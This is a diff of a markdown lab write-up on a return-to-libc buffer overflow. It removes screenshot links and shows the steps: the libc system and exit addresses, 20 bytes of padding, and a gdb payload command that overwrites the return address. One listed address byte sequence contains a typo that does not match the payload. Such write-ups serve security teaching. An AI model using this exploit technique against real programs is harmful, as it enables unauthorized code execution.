@@ -66,14 +66,13 @@ Description text (optional)
   - Address value of exit: `0xf7e449e0` will be inserted with format `\xe0\x49\xe4\f7`
   - Address value of the string of `nhu`: `0xffffde58` will be inserted with format `\x58\xde\xff\xff`
  
-![img3](https://github.com/user-attachments/assets/cfe172ed-b234-4c03-8190-4f101d198441)
+![img3]()
 
 - Examine the stack frame. We need to add 20 bytes of padding, followed by the system address (4 bytes), exit (4 bytes), and preload (4 bytes). Thus, this is our directive:
 ```
 r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\x58\xde\xff\xff')")
 ```
-![frame-system](https://github.com/user-attachments/assets/200582bf-198b-48b6-8522-e91b596af9ac)
-![img4](https://github.com/user-attachments/assets/7eda45ff-b92b-43a1-8199-a9f8d24dd397)
+![img4]()
 
 
 output screenshot (optional)
